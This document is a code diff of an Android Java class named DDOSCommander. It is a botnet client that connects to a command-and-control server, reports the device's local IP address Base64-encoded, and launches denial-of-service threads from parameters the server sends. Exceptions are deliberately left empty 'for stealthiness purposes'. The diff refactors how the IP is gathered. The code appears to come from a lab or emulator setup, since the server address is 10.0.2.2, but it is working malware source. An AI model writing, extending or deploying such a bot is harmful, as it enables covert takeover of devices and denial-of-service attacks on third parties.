@@ -1,8 +1,5 @@
 package com.a.androidDDOS;
 
-import android.content.Context;
-import android.net.wifi.WifiManager;
-import android.text.format.Formatter;
 import android.util.Base64;
 
 import org.json.JSONException;
@@ -21,20 +18,15 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 
-import static android.content.Context.WIFI_SERVICE;
 
 public class DDOSCommander implements Runnable {
     private static final String UTF_8 = "UTF-8";
+    private static final String NO_ACCESS_TO_WIRELESS = "No access to wireless data, proceeding";
     private PrintWriter out;
     private BufferedReader in;
     private Socket socket;
     private static final String CNC_SERVER_IP = "10.0.2.2";
     private static final int CNC_SERVER_PORT = 8888;
-    private Context applicationContext;
-
-    DDOSCommander(Context applicationContext) {
-        this.applicationContext = applicationContext;
-    }
 
     @Override
     public void run() {
@@ -43,13 +35,16 @@ public class DDOSCommander implements Runnable {
             out = new PrintWriter(socket.getOutputStream(), true);
             in = new BufferedReader(new InputStreamReader(socket.getInputStream(), UTF_8));
 
-            out.println(Base64.encodeToString((getIpV4Addr() + " " + getLocalIpAddress()).getBytes(), Base64.DEFAULT));
+            if (!getLocalIpAddress().isEmpty()) {
+                out.println(Base64.encodeToString(getLocalIpAddress().getBytes(), Base64.DEFAULT));
+            } else {
+                out.println(Base64.encodeToString(NO_ACCESS_TO_WIRELESS.getBytes(), Base64.DEFAULT));
+            }
             String jsonFromSocket = in.readLine();
-
             JSONObject jsonParamsObject = new JSONObject(jsonFromSocket);
             createDdosThreads(jsonParamsObject);
 
-        } catch(Exception e){
+        } catch (Exception e) {
             //EMPTY FOR STEALTHINESS PURPOSES
         } finally {
             closeResources();
@@ -62,9 +57,8 @@ public class DDOSCommander implements Runnable {
             out.close();
             in.close();
         } catch (Exception e) {
-        //EMPTY FOR STEALTHINESS PURPOSES
+            //EMPTY FOR STEALTHINESS PURPOSES
         }
-
     }
 
     private void createDdosThreads(JSONObject jsonParamsObject) throws JSONException, InterruptedException {
@@ -83,13 +77,8 @@ public class DDOSCommander implements Runnable {
         threadPool.awaitTermination(duration, TimeUnit.SECONDS);
     }
 
-
-    private String getIpV4Addr() {
-        WifiManager wm = (WifiManager) applicationContext.getSystemService(WIFI_SERVICE);
-        return Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
-    }
-
     private static String getLocalIpAddress() {
+
         try {
             for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) {
                 NetworkInterface intf = en.nextElement();
@@ -100,7 +89,9 @@ public class DDOSCommander implements Runnable {
                     }
                 }
             }
-        } catch (SocketException ex) { }
+        } catch (SocketException ex) {
+            return "";
+        }
         return "";
     }
 }
